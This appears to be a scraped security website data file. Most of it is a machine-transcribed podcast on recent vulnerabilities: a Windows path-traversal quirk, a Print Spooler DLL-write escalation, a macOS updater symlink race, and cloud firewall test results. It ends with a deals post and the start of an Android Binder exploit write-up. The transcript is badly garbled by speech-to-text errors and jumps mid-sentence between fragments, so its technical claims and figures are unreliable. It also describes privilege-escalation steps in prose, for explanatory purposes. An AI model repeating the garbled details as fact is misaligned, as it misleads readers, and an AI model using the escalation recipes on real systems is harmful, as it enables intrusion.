whatever but as an issue like there's absolutely going to be with her code that checks for path traversal in this way and it's you know the recommended best practice is not the best\", \"start\": 6122.4}, {\"speaker\": 1, \"line\": \" practice it seems like Microsoft kind of dropped the ball there I think even if you were right and for some reason they couldn't fix the actual API function implementation they should have at least amended the documentation and made it clear that that Quark exists that way you know you know when calling this function and sure to replace backslashes with our forward slashes with backslashes because like it's hard to do that but if you don't know that you don't have to do that then people aren't going to do that though if you couldn't fix the function you should have at least a met at the documentation so I mean Microsoft should get called out for this a little bit because yeah that's not what exactly is going to cause issues and other applications that it's not really their fault so yeah fun fact though I didn't look into it too much but something in this blog post said that they actually used this issue to tape a hyper-v guests through the hyper-v hyper-v manager because I think the hyper-v manager has access to the host paths and you could pull off that path traversal from the guests though usually path traversal is definitely an issue but it's not something you typically consider as like a VM Escape Vector so I thought that was kind of interesting but that's that's kind of a side note more important note is you know that Windows API function doesn't function is expected and hopefully Microsoft you know at least a Mensa documentation to make that more known so yeah I guess this this post isn't just a research post but it's also kind of a PSA I guess not regard but we kind of wanted to make sure we covered that that being said we can move on so we haven't had a named exploit in a very long time see well I've been going dry a little bit\", \"start\": 6157.8}, {\"speaker\": 2, \"line\": \" well I mean facts hell which is related

relationship kind of thing but this post gives a lot of background into how printers and stuff work and the details of how the Print Spooler Works under the hood with a registry and all that stuff I will say I think the post is a bit too long because it doesn't seem like you need to be to intimately familiar with all of that background to understand what the issue actually is and they don't get into the issue until the very bottom sliver of the page\", \"start\": 6306.0}, {\"speaker\": 2, \"line\": \" yeah no don't need to be that familiar it's very kind of easy to attack that's said and he does actually mention this early on is you know but this is Windows internals thought well I don't think says they'll calm but Windows internals blog so we're going to go into the internals I felt like I could give it to him for that but yeah there's there's actually I think I linked you to a Twitter post that basically summarizes that and I'll just bring it up here but the understanding of the Twitter is create a printer port pointing to a missing dll in a privileged location print to that Port crash the spooler service or reboot and now your original print is written to the dll path as system and ready for dll hijacking it all fits into tweet that's the gist of what's going on for this attack the specifics of it oh go ahead\", \"start\": 6348.1}, {\"speaker\": 1, \"line\": \" I was just going to say I am gonna I'm gonna go a little bit deeper into it basically the issue seems to be like if you just go into a printer dialog and try to add a printer port that goes to a dll and system32 for example you do get an access denied prompt which makes you think initially okay this you know this is safe you know you can't just create a printer port the points to a dll in a privilege path but what they actually ended up finding when they dug into it was if you add it directly through something like Powershell the port isn't validated the problem is the port validation happens on the UI side of the printer dialog it doesn't happen in the actual component that adds the port so\", \"start\": 6409.6}, {\"speaker\": 2, \"line\": \" so to be clear some of it so it doesn't happen when it adds support but it will happen when you try and print when you right tuxie check happens when you try and access the printer port so even though you might be able to overwrite a dll with this in a privileged location and add the printer port until you can try and write to it and just to be clear so we're talking about the printer port when you have a printer you've got the printer port and obviously a printer driver drivers can generally be added by anybody as long as it's kind of like a driver that already exists you can like a add a new driver but you can load printer drivers that already exists in the system so your generic / text only printer driver will effectively when you're printing to it if you literally just print a bite to it it prints that bite out so when we're talking about like printing you can literally just print bytes out to a file for your printer port could be a file which I actually didn't know and I had never really looked into it that much like it doesn't surprise me that that it could be especially like this generic one if it were if the port was a network it would just write those bytes out over on the network so you have those two parts so having the printer port you could set it to whatever file you want to kind of write or print too but when you try and print with that's where the access check comes in and obviously in the UI as you mentioned it'll check it then when you try to have but if you use the commands because it only happened because that check only happens on the excess you're able to kind of get around it by creating it and then later you're able to ask like but I'll like you keep talking about it\", \"start\": 6454.4}, {\"speaker\": 1, \"line\": \" yeah so like you were saying if you try to access the file or access the printer port you will get an error because they attach a user token to the file access operations so if you try to exploit it it will fail because your user is not really good it's not going to have permissions to write into like system32 for example but where it gets interesting is if you can crash or kill the spooler or reboot the system or anything like that the file access will succeed I'm assuming this is due to it using a I'm token before the user token can be captured so the the default token that it uses before it gets so written has more\", \"start\": 6566.1},

that shadow job file while I believe that's what it was I might be mistaken okay like I said it's a beautiful long read and he talks about a few different things that are semi\", \"start\": 6602.8}, {\"speaker\": 1, \"line\": \" related yeah ultimately that file does end up getting written without that impersonation token and what you end up there what you end up with is not only is the file being written and you're bypassing the access control check it's also persistent because it's on the file system but the other thing is too is because the right isn't being impersonated as the user it's also stealthy because if you go you know if you go into a like system32 for example and you see a dll file there that's written by a user ER that's going to be a pretty suspicious you know what I mean if you're doing forensics or something like that that's that's going to be kind of a red flag but because that impersonation token isn't being used it's writing it as system so it looks like a legitimate dll file that's in there so it's kind of like a two-pronged issue it's not only allowing you to do the Access Control Bypass but it's also take away that trust factor I guess a bit because it's not being impersonated as a user who actually committed the print so we're saying there's a lot of background there it's an interesting issue I think they even said in the blog post this was like

time the printer spooler service is probably the one of the oldest Services probably still running on windows so it's not too surprising that you find like issues like that in that area but printers

with their defense in depth the fact that this this updater component exists outside of sandboxing is the reason why the article author went after that component so getting into the actual issues the first issue is there updater uses xpc for inter-process communication which is an apple provided IPC mechanism at functions over XML and property list which we've actually talked about a little bit in the past with the Sadducees were I think that was last week and basically what they do there is they do a check on the bundle ID of the client process for authentication problem is there that trust in the bundle ID is kind of misplaced that bundle ID can easily be faked by just you know creating the directory structure yourself though the trust put in that bundle ID is is unfounded and that kind of breaks assumptions that lead to the other issues the second issue is the download folder from the clientbundle directory is moved to a temporary folder which is outside of the user access which is

{\"speaker\": 2, \"line\": \" directory yeah no quickly mention that that temporary directory move basically what's going on there is the are the idea of that is so that moves it somewhere that the user can't write to so that the next issue basically what happened of so that you know as it does any sort of validation stuff the user can't modify so that's why it's moving this temporary download obviously it's doing an update so it's going to be downloading a file to update and the first is she there just kind of be clear basically it ends up being that any application can connect and call the xpc functions or send the messages and pretend to be something that's not not so yeah you can go on into the race condition\", \"start\": 6935.6}, {\"speaker\": 1, \"line\": \" so the third issue is like it's very common you see it on Windows a lot it's not just on Mac OS for sure and it's a race condition in the validation of the binary file in the temp test folder called hello root and this binary as you can probably guess by the name is ran as root and so this this like binary file is validated to make sure that it's not just malicious binary that was placed there by an attacker but like Z was mentioning because of that second issue because you can control it through the symbolic link you can basically caused a time of check time of use issue you can write the valid file there to make it pass validation and then post validation symlink it to the file that has the malicious content and then you have you can run an arbitrary binary as root 7 oz LP\", \"start\": 6983.7}, {\"speaker\": 2, \"line\": \" just one slide in accuracy there's you've already got the same link going out somewhere you control so rather than Sim linking it to the invalid binary you're just replacing the contents of what it's symlink to yeah the symlink already exists you're here you're just changing the content between when it's a valid binary and when it's going to have launched just because you just mentioned putting in new symlink which isn't quite accurate because you can't change that symlink once it's moved into the temp directory but because that's symlink go we're outside that he do have permission to change you can still change the file\", \"start\": 7036.4}, {\"speaker\": 1, \"line\": \" itself yeah so essentially recapping the first issue allows any process like Zoom saying to use the xpc and then that facilitates the ability to exploit the second and third issue which is the race condition to modify the contents of the binary that's run as root so this was really cool most of the time when you see LPE write-ups they're generally like one stage this one is three stages and you have like a mixed bag of issues between all of them you have a false assumption which which causes the logic bug and you have the same linking issue and a race condition so it's fun to see those kind of tied together getting into the fix the fixes they just check if the if the folder contains any siblings before validating the binary they use a new function called validate paths so that will check the path of the of the file that they validate and if it's a symlink it will reject it it just won't process it\", \"start\": 7073.1}, {\"speaker\": 2, \"line\": \" yeah and on the exploitation note I will add that they do because obviously with race conditions you always want to enable as large of a race window as possible so you want as long of a period as possible between that validate binary call and the launch arm Hammer which is what they call their updater you want as long of a window as possible between that so what they did for that was effectively just trying to flood that xpc service to make it busy while doing the Race to try and create that it then that's all I did I just want to point out they did have something to try and create a longer longer window for themselves there because that is like as is it you know literally if statement in the end to use that isn't a huge window\", \"start\": 7131.2}, {\"speaker\": 1, \"line\": \" yeah those those race window extension techniques I think is like the official like or the you know de facto term for it but like extending those race windows in themselves are often really interesting in fact I've seen entire sorry entire conference talks dedicated to just extending race condition Windows because of race conditions can be so unpredictable and unpredictable to something you don't want and exploits generally so yeah that's definitely a good mention there is those are always fun to see because they're generally clever and how they work and they're they're valuable information that can often be reused in other situations so yeah it's good that you brought that up as well thank you\", \"start\": 7180.1}, {\"speaker\": 2, \"line\": \" that\", \"start\": 7224.3}, {\"speaker\": 1, \"line\": \" concludes all of our exploits we're going to move into our research portion and our first one is on Cloud Web application firewalls so this is a blog post by tuomo Makonnen I think I said that right I hope I did and this research is a little bit older it's from March 6th and April 14th for the second part but we figured it's still worth covering because it's almost certainly still relevant today and it's basically looking at Cloud Web application firewalls to eight how different ones perform at preventing common web application attacks so in the first blog post they looked at Asia application Gateway Barracuda web application firewall is a service aw s YF with Amazon manage rules and AWS with Fortinet manage rules and the types of attacks they tried were command injection xss and file inclusion SQL injection path traversal and malformed XML\",

like / broke they have it in front of so like it I don't know like that really encourages you to just use their manage rules which they provide which can provide you I'm going to assume they have more than just 20 rules I think I think the Ford in that one though is like 20 box mine plus some other costs like for actual traffic like obviously it's AWS so everything else there but I mean I don't know that says I really you know discourages having a lot of roles obviously you don't want a lot of rules but I don't know that just feels like a very small amount of rules to\", \"start\": 7296.7},

\"line\": \" yeah I don't know feels like it just would add off way too quickly now that's said I didn't look at what Azure application Gateway cost it in terms of the rules and using the manage roles

of\", \"start\": 7378.6}, {\"speaker\": 1, \"line\": \" not but one thing I did want to ask before like add in there before we get into the results is even with the AWS managed you're limited to how many Rogue groups you can use so they mentioned that in there is they had to kind of pick and choose which row groups they wanted to use in testing because I think they can only use up to six roll groups so used the sqli rule set the Linux ruleset known bad inputs common rules PHP rules and admin protection rule set so even if you use the managed one you still can't use like more than like a certain number so you're playing your\", \"start\": 7406.8}, {\"speaker\": 2, \"line\": \" pair Weathers more rules inside of each of those rulesets\", \"start\": 7443.4}, {\"speaker\": 1, \"line\": \" though it's a set yeah\", \"start\": 7447.1}, {\"speaker\": 2, \"line\": \" so I'm not sure what the managed actually I think yeah no I'm not sure what Amazon's manage one cost was I don't recall\", \"start\": 7449.2}, {\"speaker\": 1, \"line\": \" yeah so like you were mentioning the Amazon one does sound pretty expensive and with the man is real said you were wondering okay you would hope those those rules would be good well when we get into the test results it doesn't look promising for Aid of you huh so they ran tests against all the web application firewalls we just talked about and they measured their success rates against different types of attacks so the the AWS laughs with Amazon rules did the poorest out of all of them actually with a few categories like command injection and ssize they were under 5% it was like really low success rate in preventing the attacks and I think their highest was 45% and that was with path traversal which in theory is probably like one of the easiest categories to like mitigate against the Ford and that one did a little bit better but like not much better and then the the asier aw or the Asia where I've actually did the best its lowest number with 71% that was in cross-site script\", \"start\": 7459.7}, {\"speaker\": 2, \"line\": \" so so X as your did the best for part of Ryan I've got part two results up here in Google Cloud armor actually I think did the best overall even though SSI a Sher Khan 100 whereas Google Cloud caught 99 on everything else it was either tied or equal so I was kind of mentioning there that I was a little bit it was a little bit surprising a little bit not surprising and they kind of mention it or they do mention at the end of part 1 their conclusion is they were expecting to need a kind of come up with some custom bypasses to start seeing the differences between them enough for them to be just so terrible right off the bat but what's not surprising here is you'll notice for those V actually who can see the video and not just watching the a sure wife has in Brackets ERS decided as does the Google Cloud platform Cloud armor has CRS beside it cloudflare also has the CRS beside it but it's using a difference here I sort of see it CRS is kind of where I'd say it's unsurprising CRS is the matzo care a rule set so that it are like the rule sets of that's coming I believe a wasp was involved with creation of some of those or a lot of it it's the core rule set from not scary so it's been around for I want to say decades but it might have been somewhere in like mid-2000s when it actually started I don't know the actual start date it's had a lot of time to mature it's singing a lot of taxa name to slowly add an improved to it it's been around for a while and that maturity shows in these results by using the latest version you're getting you know these 90% of the attacks being block now on the other hand like this could be overzealous blocking does that mean you could get a hundred percent of you just block everybody and every request so like it is worth kind of pointing that out but um I'm gonna hope they at least test that for false positives I'm not sure if they did\", \"start\": 7525.3}, {\"speaker\": 1, \"line\": \" though I don't think they did\", \"start\": 7669.1}, {\"speaker\": 2, \"line\": \" which actually would be another interesting thing to look at here is also positive so when I say false positives I mean just normal request that aren't actually trying to be an attack because most of these requests like just because it's blocking some before command injection\", \"start\": 7671.0}, {\"speaker\": 1, \"line\": \" does it mean there\", \"start\": 7686.7}, {\"speaker\": 2, \"line\": \" actually is command injection like in the end application the application firewall is just looking at the request and try and prevent it they're not even letting it hit the app but that said I mean it really is just it looks good for a CRS and modsecurity the work they've done they're like that open its open source you can run that yourself and that maturity shows here I think I've been disappointed by the performance of some things other services and for cloudflare they're using an older version of CRS I don't know which version but that's why there's a significant difference between how Asher and Google Cloud platform do and what cloudflare got\", \"start\": 7688.1}, {\"speaker\": 1, \"line\": \" yeah though what I was going to say there was I think that is a good point to bring up just because when you're talking about like a web app the user experience you would probably have you would want potentially less blocking than overly aggressive blocking like you would rather especially because like you were saying that doesn't even it's not even guaranteed there is an issue that it's going to be able to hit though you don't want to like hurt the user experience so that is a really good point to bring up the most interesting data set I found out of all of the tests they ran were against cloudflare now I know you said they are using an older CRS but what I found weird was actually the inconsistency between categories because when you look at like Asia and Google Cloud platform the numbers are all pretty close like you're looking at like a hundred ninety-seven 83 9999 91 but then when you get the cloudflare you've got like 99% and path traversal and then two percent in SSI like there's like way more of a gap but\", \"start\": 7733.9}, {\"speaker\": 2, \"line\": \" they just remember Society they're just not checking yet I'd be quite confident to say that so SSI finally I was actually talking about SSI on Reddit couple days ago where somebody had mentioned like they had no idea what this is SSI is like dot s HTML

wipe Stacks have changed so much since time like this is something there you go like is it kind of looks like an HTML comment the director of parameter value like kind of doing that for General s i so you can do this in your HTML you could do this include and the server which I'm not sure which server still support it yeah it looks like it is generally supported probably have to enable it still but um it's not something that's used too often anymore like this is something you know in 2002 you don't total you don't want to run like PHP which was super popular at the time you don't want to run something like that you just but you do want to include pages and kind of have some separation your code in your HTML so you might do an SSI include and there are taxi you can do if you're able to control values being included or if you can inject like the SSI tags into something there's a few different things but either way SSI is quite old my assumption here is because of how few websites it's still using SSI cloudflare just doesn't even do the checks for it\", \"start\": 7849.0}, {\"speaker\": 1, \"line\": \" yeah and I think the fact that people get it confused or like don't even know exactly what it is just highlights how uncommon it is\", \"start\": 7935.8}, {\"speaker\": 2, \"line\": \" yeah well what had happened on Reddit was somebody had called it out as being like Oh well if you don't even know what SSL is because they read that as being SSL not SSI and kind of had their comment about not even knowing that or it's like nope this is SSI this is something and hack this site still has it on there but hack the site was created in what 2003 I to say maybe for Darth increase its it was a while ago put simply and like SSI was still you know injections that are still a thing I've never seen it in like professionally speaking I never saw anybody using it I did I have seen a huge like says as a teenager I had seen it a couple times did you ever use it no maybe once actually I think I might just try to locally and I was playing around with exploiting it okay but not like not for anything of value\", \"start\": 7942.5}, {\"speaker\": 1, \"line\": \" so obviously the test results are like the big thing of the blog post that's like the highlight of it they also talked about some conclusions they came out of testing with though one was that URL encoding affected the performance of web application firewalls across-the-board attacks with encoded URLs where generally more successful which I guess kind of makes sense you know it's just missed and the laughter just not decoding the URL I don't know if that's like a performance trade-off thing or if it's just something that was missed in some of them but you know that that's that's a pretty cool conclusion that came out of it generally I like this kind of research that compares two different Technologies to test the effectiveness I think they offer useful Insight even to non-security people who just want to evaluate like which solution is the best for them it offers some useful insights and conclusions like the one with the URL encoding for example one thing I did want to note about their test though that I found a little bit weird is they have a vast difference in number of test cases ran for each category so path traversal for example they had 9,000 test cases ran where excess only had 300 now you have a very vast difference between some of the categories and how much they were tested so you are going to want to factor that into some of the results because while they ran the same number of tests for each web application firewall and that gauri it shows that some of the groups are going to have inflated numbers with the lower amount of test cases or deflated you know depending on how well they did so it's probably a little bit less accurate than it could have been I don't know why they didn't try to match up the test case count more closely I\", \"start\": 8004.8}, {\"speaker\": 2, \"line\": \" mean that's the same time because it's act but at well yeah because these are different attacks different techniques that could be used there you know it doesn't really

2, \"line\": \" dropping some video there so I apologize if something cut out but I don't think that test case like I do think like 9,000 is quite a bit or a path traversal by kind of comes down to how many different ways you can attack something too like I mean sure in theory of got unlimited ways to attack something but I don't know I feel like that would be arbitrary to be requesting that okay so you need you know 500 xss attempts and 500 SQL injection and then you need also 500 of whatever other like server-side include injections\", \"start\": 8130.4}, {\"speaker\": 1, \"line\": \"

generally though I don't I don't see any issue with the test results though I didn't think about what you were saying about how you kind of want to check the other side too because you don't want to be overly aggressively like blocking so that could be kind of like a nice next step is to test these web application firewalls maybe with the same I don't know like I would want to see how often it's falsely doing that the false positive so maybe real\", \"start\": 8200.1}, {\"speaker\": 2, \"line\": \" so I would just want to test Jake's is well so I would imagine just innocuous test cases test cases that aren't doing command injection at all that aren't doing anything whatsoever\", \"start\": 8228.7}, {\"speaker\": 1, \"line\": \" those are gonna be harder to generate though that's the only thing\", \"start\": 8240.5}, {\"speaker\": 2, \"line\": \" well you can in theory just do random data you could that probably won't be the best yeah there's definitely some questions on how you do the testing but I do think that would be interesting to see currency false positives and in the real world I mean there are where you're running it kind of matters to like you're going to have more false positives on say a hacking Forum where people are talking about things attack well not even trying it because try and get his in a false positive that should be blocked but who are going to be talking about a tour in going to include those tokens or those little words that get caught up yeah\", \"start\": 8243.9}, {\"speaker\": 1, \"line\": \" so yeah that would be a nice next step is just to see if you could measure false positives as well but you know I don't regret to them for not doing that that is like a whole nother can of worms kind of so-so Dian cecht put out a article on fuzzing TLS certificates from their asn.1 grammar so TLS certificates they use this grammar I haven't heard of it before but this post basically describes that grammar as like an old version of protobuf for like serialization and stuff like that yeah\", \"start\": 8287.4}, {\"speaker\": 2, \"line\": \" that's the summary of it I mean basically it's just a definition or a say grammar contains several different types there's they show the example there's like an integer utf-8 string you can just Define exactly what your object is so for TLS certificates in X what is a 509 508 whatever the number is the rfc's the fine the asn.1 of what that should look like and there are other protocols I use it other things that use it to assess and one is pretty widely used actually just in a lot of kind of older Tech in the background rather than you know it's but definitely anywhere you have like certificates is almost certainly almost certainly has an ASN one for it so the idea here is mentions fuzzing TLS certificates but what they actually go about doing is building a fuzzer that will take asn.1 as input and output fuzzing info and generate your test space on ASN\", \"start\": 8318.2}, {\"speaker\": 1, \"line\": \" yeah so this grammar like the first example they give here like the one you were talking about with the integer the integer to utf-8 string that one is pretty simple but they note that the grammar can get super complex they know that it has like 13 different string types you can add Fields constraints you can have information objects parameterisation templating um you know you can insert that Meme here I heard you like grammar so I gave you grammars that you can use in your grammars but like so they show here like when you have such complex grammars like that it's going to be an interesting Target for fuzzing because of how many different possibilities there are and how many edge cases there could be by extension of that so they show here how they compiled the grammar to Generate random Absa abstract syntax trees to provide for smart fuzzing TLS certs or anything that you asn.1 I guess so this post is more of an early stage type of research post there's no results yet

something that that Opti bookmarked will say that so we're going to call cap off the show with a shout-out this was kind of a last-minute addition that I saw right before we started the podcast today and it's the the sea is a the Department of Homeland Security cyber security and infrastructure Security Agency it's a real mouthful easier to just say C is a and the FBI put out this read this article that talks about the top 10 most exploited vulnerabilities and the the list is actually kind of interesting as the bait headline would go the results will shock you in a little bit or at least

very first one like this isn't in like the reverse order like a countdown so I'm assuming office is the most excellent so you're saying you wouldn't have expected that whereas I think it's obvious that stuff like office or is it Dobby in here too like I'd expect those office tools to kind of be compromised because that's part of that comes down you know you fish somebody to open up or social engineer I should say somebody to open up your doc file it's a very easy to get that done and a lot of environment and you can get a lot of access through like a secretary's computer or something like

{\"speaker\": 1, \"line\": \" you are I guess part of the reason I'm surprised by it is for one I don't know if this is just a bias from like just me not being like around a business environment super often but office doesn't really it seems to be falling at a favorite little bit and what I mean by that is with the rise of things like the Google cloud like Google Docs and stuff like that it seems like companies are really using Microsoft Office like some of the companies that I've worked at haven't even really used it and so I thought its usage was kind of falling off and the other thing was I would expect that there would be what I expected with top 10 most exploited vulnerabilities were stuff like let's say browser bugs like drive-bys and stuff like that that could easily quickly deliver malware like yes that is technically that is usually used for like more targeted attacks as well but I don't know I just did for some reason I just didn't really expect off this to be on the list as much as it is like one two three four five I think six six of the top 10 were all in office and then you know you had a few in like Adobe you know Flash Player which again is something that isn't really used anymore but it was used a lot in the past so it's probably inflated by that and then like Drupal and stuff like that like I don't know I just expected I guess some more like browser stuff

notice right in there they put Associated malware so that's that's really cool but yeah I don't know who the let's just surprised me but you know I think this list might be interesting to people out there it's also interesting that pretty much all these CDs on this list are from 2017 so these are the top 10 most exploited vulnerabilities in 2016 to 2019 so anything before 2016 isn't in the list I guess it kind of makes sense to 2017 is in the list of most Because unless people are staying up-to-date really often which with something like Microsoft Office probably I don't know how common

My primary use for it has been while working as a consultant, while I've got plenty of security background, I don't always know the intimate details about a particular technology stack. I would turn to Pluralsight to get up-to-speed on a particular topic before an engagement on a new tech stack. The information certainly is available through some Google searches, the conviennce of having everything readily available and there being some baseline standards upheld by PluralSight's instructors did make it a handy tool. I wouldn't consider it a worthwhile investment if you're looking to learn about security, they are lacking in quality security courses, and those that exist are not really worth it in my opinion.</p>\n<p><strong>Specter</strong> - A lot of PluralSight's security content is focused on web app hacking or network security. While there are a few courses that focus on binary, they're few and far between, and I wouldn't say the subscription is worth it for that alone. Even at the 40% off discount, I'd recommend using the trial to make sure there's enough courses you find interesting before committing to a subscription.</p>\n<hr>\n<p><a href=\"https://www.oreilly.com/online-learning/cybermonday-2019.html\">O'Reilly Online Learning</a></p>\n<p><strong>The Deal</strong> - Annual subscription to the Online Learning program at 50% off ($199)</p>\n<p><strong>zi</strong> - As the name implies, this is an online learning platform, unlike PluralSight, this includes access to books from O'Reilly and other publishers such as No Starch Press and Wiley, two of my favorite tech publishers. One of the most interesting features is the sandbox envrionments they provide (Kubernetes, Python, Tensorflow, and Ubuntu), basically cloud-based VMs running the respective tools that you can access on-demand. They also provide practice tasks and interactive walkthroughs of some basics tasks. While the existing tutorials are quite fundamental, its an interesting setup (using Katacode) that would probably quite useful if you were learning any of the topics covered. For most I think the biggest value comes from the library access and video course access. At roughly $25 a month, its not cheap, but they offer a singificant number of <em>good</em> books, both in general and security related. Basically every book I tend to recommend is on there so its a good library.</p>\n<hr>\n<p><a href=\"https://nostarch.com\">No Starch Press</a></p>\n<p><strong>The Deal</strong> - Last year the deal was 42% off their books, this year hasn't been announced yet, just that they are planning something.</p>\n<p><strong>zi</strong> - No Starch is one of my favorite technology and security book publishers. Many of their books are excellent in quality and enjoyable read. You've probably heard of some of their books such as the XYZ Hacker's Handbook series and the Black Hat and Gray hat {language} series among many other non-series books. If they run another steep discount I'll likely be picking up physical copies of Black Hat Go and Serious Cryptography and I'd recommend taking a look at their library, and maybe asking in our Discord for some book recommendations, they have some great content.</p>\n<hr>\n<p><a href=\"https://pastebin.com/pro\">Pastebin Pro</a></p>\n<p><strong>The Deal</strong> - In past years the deal was $20 for the Lifetime Pro Membership. No indication if it will be the same this year.</p>\n<p><strong>zi</strong> - If you use pastebin, its a pretty good deal. If you don't use pastebin, well, you probably won't benefit from this. Pastebin is basically just a simple website to paste text and share it temporarily. The fact its so simple to use and no authentication necessary has lead pastebin being used to exfiltrate or dump data from compromises leading to a secondary feature of pastebin: keyword monitoring. With a Pro account you get access to alerts on certain key words appearing in a paste and the ability to use their API to scrape data. The last feature of Pro is unlimited unlisted and private pastes that don't show up publically. I know many people in the security industry do use pastebin for quick throw away things so I figured it was worth mentioning here.</p>\n<p><strong>Specter</strong> - The unlimited unlisted and private pastes, the API access, and the larger file limit (10MB as opposed to 500KB) is well worth a lifetime subscription if it's available, however it's not the end of the world if you miss this deal. As zi said, if you're a Pastebin fan, this is probably worth the buy. It's worth noting that there are other paste sites that offer some of what Pastebin pro offers and more for free if you're using Pastebin for it's quick code sharing functionality rather than scraping it.</p>\n<hr>\n<p><a href=\"https://pentesterlab.com/pro\">PentesterLab Pro</a></p>\n<p><strong>The Deal</strong> - 13.37% off annual subscriptions.</p>\n<p><strong>zi</strong> - PentesterLab is another learning platform, this time with a security focus (web application security) and very-much hands on. With a Pro account you get access to a number of web-security 'courses' which are generally short and focused on a single, specific exploit, or attack technique. You are provided with a live, vulnerable envrionment to practice within, as with many things you could go and setup your own VM and attack it yourself, but having one ready for you saves you a ton of time and hassle. I have not used PentesterLab myself so I cnanot comment on the quality of instruction.</p>\n<hr>\n<p><a href=\"https://protonmail.com/blog/black-friday-2019/\">ProtonMail</a></p>\n<p><strong>The Deal</strong> - 33-50% off ProtonMail and ProtonVPN.</p>\n<p><strong>zi</strong> - This is another product I've not used, but I know would be of interest to people who care about security. ProtonMail offers End-To-End encrypted email between ProtonMail customers. You can read more about their security features on their website.</p>\n<hr>\n<p><a href=\"https://store.vmware.com/store?Action=html&amp;Locale=en_US&amp;SiteID=vmware&amp;pbPage=BlackFridaySale\">VMWare Workstation Pro and Fusion pro</a></p>\n<p><strong>The Deal</strong> - 35% off Fusion Pro and Workstation Pro, 30% off the non-pro versions.</p>\n<p><strong>zi</strong> - Running Vms is a constant part of life in the security industry. Maybe I'm running a VM just to have access to some Linux tooling from Windows, or to run some services I'm assessing away from my actual desktop. Whatever the case, VMWare is widely considered the best Desktop VM platform, but its also the most expensive. If you're finding yourself not too happy with Hyper-V, Virtual Box or whatever you use, now would be a good time to atleast checkout VMWare's offering.</p>\n<p><strong>Specter</strong> - VMWare is a daily driver of mine, so unsurprisingly this is another deal that I recommend people interested in security take, especially if you're planning on doing research into kernel development / exploitation, and/or malware research. Between VirtualBox, HyperV, and VMWare, I've found VMWare to be the most performant. The pro editions also allow you to use snapshots which are valuable to quickly get back to work when working on things that could end up crashing the kernel a lot (such as driver development or exploits).</p>\n<hr>\n<p><a href=\"https://shop.hak5.org/\">Hak5</a></p>\n<p><strong>The Deal</strong> - Various discounts on the Hak5 store.</p>\n<p><strong>zi</strong> - If you have a need for their products now is a good time to buy or upgrade to a newer model, if you don't have a need I'd recommend skipping. Hak5 is fairly well known for the Pineapple and for their numerous hacking tools, everything is always pretty decent quality and often has some quality of life improvements over whatever you might make yourself with off-the-shell components. The thing is, for a lot of people they see these things and think about how 'cool' they are or how much of a 'hacker' they'd be if they had it without actually considering any practical usecase. Meaning many purchases just become novelty items collecting dusts on a shelf after a few months. If you have an immediate and known use for them, go ahead and pick something up, but don't waste your money if you don't yet know how you'd use the tools. Its very much for professionals in the sense that the average peope just isn't going to be in a situation to be dropping a rogue AP into a corporate network but a professional might.</p>\n<hr>\n<p><a href=\"https://www.namecheap.com/blog/vault-will-open-black-friday-cyber-monday/\">NameCheap</a></p>\n<p><strong>The Deal</strong> - Various hosting and domain related deals</p>\n<p><strong>zi</strong> - If you want a vanity domain, there are usually good discounts going on and some cheap hosting. Not sure about the quality of hosting through NameCheap, but I've registered a few domains with them without any issues.</p>\n<hr>\n<p><a href=\"https://lowendbox.com\">LowEndBox</a></p>\n<p><strong>The Deal</strong> - Various deals from hosting providers</p>\n<p><strong>zi</strong> - I like to pick up a cheap server ever now and again just to run little scripts, or apps away from my main servers. I wouldn't trust these deals for anything meant for production, but having a server to run some long running scripts/bots/scanners on is nice, and LowEndBox will usually list some very good deals. One of my better deals was a VPS at $60 for 3 years that I've been running a service that is publically used on for nearly 6 years now. Now is also a good time to check with your favorite host to find deals.</p>\n<!--kg-card-end: markdown-->","slug":"black-friday-for-security-professionals"}},{"node":{"title":"Analyzing Android's CVE-2019-2215 (/dev/binder UAF)","path":"/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/","date":"8 November 2019","description":"Over the past few weeks, those of you who frequent the DAY[0] streams over on\nour Twitch may have seen me working on trying to understand the recent Android\nBinder Use-After-Free (UAF) published by Google's Project Zero (p0).

This bug is actually not new, the issue was discovered and fixed in the mainline kernel in February 2018, however, p0 discovered many popular devices did not receive the patch downstream. Some of these devices include the Pixel 2, the Huawei P20, and Samsung Galaxy S7, S8, and S9 phones. I believe many of these devices received security patches within the last couple weeks that finally killed the bug.</p><p>After a few streams of poking around with a kernel debugger on a virtual machine (running Android-x86), and testing with a vulnerable Pixel 2, I've came to understand the exploit written by Jann Horn and Maddie Stone pretty well. Without an understanding of Binder (the <code>binder_thread</code> object specifically), as well as how Vectored I/O works, the exploit can be pretty confusing. It's also quite clever how they exploited this issue, so I thought it would be cool to write up how the exploit works.</p><p>We'll mostly be focusing on how an arbitrary read/write primitive is established, we won't focus on the post-exploit stuff such as disabling SELinux and enabling full root capabilities as there are quite a few write-ups out there already that cover that. Here's a brief overview of what this article will cover:</p><ol><li>Basic overview of Binder and Vectored I/O</li><li>Vulnerability details</li><li>Leaking the kernel task struct</li><li>Establishing an arbitrary read/write (arbitrary r/w) primitive</li><li>Conclusion</li></ol><p>Note that all code snippets will be from kernel v4.4.177, as this is the kernel I tested on personally.</p><h2 id=\"basic-overview-of-binder-and-vectored-i-o\">Basic overview of Binder and Vectored I/O</h2><h4 id=\"binder\">Binder</h4><p>The Binder driver is an Android-only driver which provides an easy method of Inter Process Communication (IPC), including Remote Procedure Calling (RPC). You will find this driver's source code in the mainline Linux kernel, however it is not configured for non-Android builds.</p><p>There are a few different binder device drivers that are used for different types of IPC. For communication between framework and app processes using the Android Interface Definition Language (AIDL), <code>/dev/binder</code> is used. For communication between framework and vendor processes / hardware using the Hardware Abstraction Layer (HAL) Interface Definition Language (HIDL), <code>/dev/hwbinder</code> is used. Finally, for vendors who want to use IPC between vendor processes without using HIDL, <code>/dev/vndbinder</code> is used. For the purposes of the exploit, we only care about the first driver, <code>/dev/binder</code>.</p><p>Like most IPC mechanisms in Linux, binder works through file descriptors, and you can add event polls to it using the EPOLL API.</p><h3 id=\"vectored-i-o\">Vectored I/O</h3><p>Vectored I/O allows you to either write into a data stream using multiple buffers, or read from a data stream into multiple buffers. It's also known as \"scatter/gather I/O\". Vectored I/O offers a few advantages over non-vectored I/O. For one, you can write with or read to different buffers that are non-contiguous without a bunch of overhead. It's also atomic.</p><p>An example of where vectored I/O is useful is a data packet where you have a header followed by data in a contiguous block. Using vectored I/O, you can keep the header and the data in separate, non-contiguous buffers, and read to them or write using them with one system call instead of two.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://i.imgur.com/IFDZCdA.png\" class=\"kg-image\" alt=\"vectored IO diagram\"></figure><p>How this works is you'll define an array of <code>iovec</code> structures which contain information about all the buffers you'd like to use for I/O. The <code>iovec</code> structure is relatively small, consisting only 